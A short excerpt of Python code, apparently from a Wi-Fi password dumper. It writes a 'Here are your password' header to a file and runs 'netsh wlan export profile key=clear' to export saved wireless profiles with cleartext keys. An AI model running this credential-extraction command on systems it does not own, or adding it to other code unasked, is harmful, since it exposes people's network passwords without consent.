...
password_file.write("Hello! Here are your password:\n\n")
password_file.close()
...
commend = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()
